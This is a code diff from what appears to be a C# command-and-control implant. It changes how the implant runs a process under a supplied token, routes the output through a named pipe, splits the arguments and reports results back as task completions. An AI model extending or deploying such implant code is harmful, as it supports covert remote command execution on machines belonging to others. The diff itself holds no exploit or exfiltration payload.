@@ -48,9 +48,9 @@ namespace SaltedCaramel
 
             // Create named pipe server and client
             // We need to use nanmed pipes to communicate with processes started using the Win32 API
-            NamedPipeServerStream pipeServer = new NamedPipeServerStream(pipeName, PipeDirection.InOut, NamedPipeServerStream.MaxAllowedServerInstances,
-                PipeTransmissionMode.Message, PipeOptions.None, 1024, 1024, sec);
-            NamedPipeClientStream pipeClient = new NamedPipeClientStream(".", pipeName, PipeDirection.InOut, PipeOptions.None);
+            NamedPipeServerStream pipeServer = new NamedPipeServerStream(pipeName, PipeDirection.In, NamedPipeServerStream.MaxAllowedServerInstances,
+                PipeTransmissionMode.Message, PipeOptions.None, 4096, 4096, sec);
+            NamedPipeClientStream pipeClient = new NamedPipeClientStream(".", pipeName, PipeDirection.Out, PipeOptions.None);
 
             // TODO: Use anonymous pipes instead of named pipes
             // AnonymousPipeServerStream anon = new AnonymousPipeServerStream(PipeDirection.In, HandleInheritability.None, 1024, sec);
@@ -65,8 +65,8 @@ namespace SaltedCaramel
                 {
                     // TODO: Use anonymous pipes intead of named pipes
                     // Set process to use named pipe for input/output
-                    startupInfo.hStdInput = pipeClient.SafePipeHandle.DangerousGetHandle();
                     startupInfo.hStdOutput = pipeClient.SafePipeHandle.DangerousGetHandle();
+                    startupInfo.hStdError = pipeClient.SafePipeHandle.DangerousGetHandle();
                     // STARTF_USESTDHANDLES ensures that the process will respect hStdInput/hStdOutput
                     // STARTF_USESHOWWINDOW ensures that the process will respect wShowWindow
                     startupInfo.dwFlags = (uint)Win32.STARTF.STARTF_USESTDHANDLES | (uint)Win32.STARTF.STARTF_USESHOWWINDOW;
@@ -80,8 +80,15 @@ namespace SaltedCaramel
 
                 // We're using lpCommandLine to start our new process because I had issues using both lpApplicationName and lpCommandLine
                 string cmdLine;
+                string tokenized = "";
                 if (argString != "")
-                    cmdLine = "\"" + file + "\" \"" + argString + "\"";
+                {
+                    foreach (string arg in argString.Split(' '))
+                    {
+                        tokenized += "\"" + arg + "\" ";
+                    }
+                    cmdLine = "\"" + file + "\" " + tokenized;
+                }
                 else
                     cmdLine = "\"" + file + "\"";
                 // Finally, create our new process
@@ -109,10 +116,18 @@ namespace SaltedCaramel
                                 // Workaround for this is to time out if we don't get a result in ten seconds
                                 Action action = () =>
                                 {
-                                    message = reader.ReadLine();
+                                    try
+                                    {
+                                        message = reader.ReadLine();
+                                    }
+                                    catch (Exception e)
+                                    {
+                                        // Fail silently if reader no longer exists
+                                        // May happen if long running job times out?
+                                    }
                                 };
                                 IAsyncResult result = action.BeginInvoke(null, null);
-                                if (result.AsyncWaitHandle.WaitOne(10000))
+                                if (result.AsyncWaitHandle.WaitOne(300000))
                                 {
                                     if (message != null)
                                     {
@@ -127,7 +142,9 @@ namespace SaltedCaramel
                                     }
                                 }
                                 else
+                                {
                                     throw new Exception("Timed out while reading named pipe.");
+                                }
                             }
                         }
                         catch (Exception e)
@@ -146,10 +163,10 @@ namespace SaltedCaramel
 
                         while (reader.Peek() > 0)
                         {
-                            message = reader.ReadLine(); // Ensure we get any output that we missed when loop ended
-                            if (message != null)
+                            message = reader.ReadToEnd(); // Ensure we get any output that we missed when loop ended
+                            foreach (string msg in message.Split(new[] { Environment.NewLine }, StringSplitOptions.None))
                             {
-                                output.Add(message);
+                                output.Add(msg);
                             }
                         }
                         if (output.Count > 0)
@@ -164,7 +181,7 @@ namespace SaltedCaramel
                     pipeServer.Dispose();
                     implant.SendComplete(task.id);
                 }
-                else // TODO: Throw exception on error
+                else
                 {
                     string errorMessage = Marshal.GetLastWin32Error().ToString();
                     Debug.WriteLine("[!] DispatchTask -> StartProcessWithToken - ERROR starting process: " + errorMessage);
